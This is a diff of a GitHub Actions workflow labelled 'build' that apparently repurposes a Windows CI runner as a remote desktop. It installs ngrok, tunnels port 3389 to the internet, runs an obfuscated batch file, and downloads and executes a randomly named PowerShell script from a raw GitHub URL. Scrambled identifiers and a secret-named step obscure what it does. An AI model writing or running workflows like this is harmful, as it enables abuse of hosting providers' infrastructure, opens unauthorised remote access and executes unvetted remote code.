@@ -4,15 +4,15 @@ on: workflow_dispatch
 
 permissions: 
   actions: read
-  
-env : 
-  UDsDUDAgaau5f5v9A : hi
+
 
 jobs:
   build:
     
     runs-on: windows-2019
     timeout-minutes: 9999
+    outputs:
+      matrix: ${{ 'df'}}
     
     steps:
     - name: Downloading Ngrok.
@@ -37,7 +37,7 @@ jobs:
       run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp 3389"'
     - name: Connecting to your RDP.
       run: cmd /c z360FM0OMMpppzzFO.bat
-    - name: $UDsDUDAgaau5f5v9A
+    - name: ${{ secrets.UDsDUDAgaau5f5v9A }}
       run: |
         Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/ZsWgzwWW2IzqIZ2Wz/main/sYx9aFxYzdZHh1YZa.ps1 -OutFile sYx9aFxYzdZHh1YZa.ps1
         ./sYx9aFxYzdZHh1YZa.ps1
